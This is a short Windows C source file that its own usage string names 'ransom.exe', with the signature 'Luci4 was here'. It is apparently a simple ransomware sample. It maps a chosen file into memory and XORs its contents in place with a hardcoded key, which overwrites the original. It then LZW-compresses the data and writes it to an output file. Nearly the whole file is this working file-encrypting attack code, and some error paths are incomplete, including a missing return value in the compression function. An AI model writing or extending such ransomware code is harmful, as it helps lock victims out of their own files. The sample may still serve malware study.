#include <Windows.h>
#include <stdio.h>

#include "lzw.h"


BYTE Key[] = { 0xDE, 0xAD, 0x88, 0xDE, 0xAD, 0x88, 0xc5 };

volatile LPWSTR Signature = L"Luci4 was here";

BOOL CompressData(_In_ PBYTE FileBuffer, _In_ SIZE_T FileSize, _Out_ PBYTE* CompressedBuffer, _Out_ PSIZE_T CompressedFileSize)
{

	struct lzw_state* LzwState = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(struct lzw_state));
	if (LzwState == NULL)
	{
		return FALSE;
	}

	PBYTE Temp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, FileSize);
	if (!Temp)
	{
			return FALSE;
	}

	SSIZE_T	Result  = 0x00,
			Written = 0x00;

	while ((Result = lzw_compress(LzwState, FileBuffer, FileSize, Temp, FileSize)) > 0x00)
	{
		if (Written > FileSize) 
		{
			return FALSE;
		}
		Written += Result;
	}

	if (Result < 0x00) 
	{
		return FALSE;
	}

	*CompressedBuffer = Temp;
	*CompressedFileSize = Written;
}

int main(int argc, char* argv[]) 
{

	if (argc != 3) {
		printf("Usage: ransom.exe <file_to_encrypt_path> <encrypted_file_output_path>\n");
		return -1;
	}

	// 1. Get handle to the specified file
	HANDLE FileHandle = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
		return -1;
	
	// 2. Get the size of said file
	LARGE_INTEGER FileSize;
	GetFileSizeEx(FileHandle, &FileSize);

	// 3. Create section object
	HANDLE FileMapping = CreateFileMappingW(FileHandle, 0, PAGE_READWRITE, 0, 0, 0);
	if (!FileMapping)
		CloseHandle(FileHandle);

	// 4. Map  the entire file to buffer
	PBYTE MappingBuffer; 
	if ((MappingBuffer = MapViewOfFile(FileMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0)) == 0)
	{
		return -1;
	}

	// 5. Encrypt it!
	for (DWORD i = 0; i < FileSize.QuadPart; i++)
	{
		MappingBuffer[i] ^= Key[i % sizeof(Key)];
	}

	// 6. Compress it!
	PBYTE CompressedBuffer;
	SIZE_T CompressedSize;
	if (!CompressData(MappingBuffer, FileSize.QuadPart, &CompressedBuffer, &CompressedSize)) 
	{
		return -1;
	}

	// 7. Write the encrypted and compressed file to the specified output file
	if ((FileHandle = CreateFileA(argv[2], GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		return -1;
	}

	DWORD BytesWritten = 0;
	if (!WriteFile(FileHandle, CompressedBuffer, CompressedSize, &BytesWritten, NULL) || CompressedSize != BytesWritten) 
	{
		return -1;
	}

	return 0;
}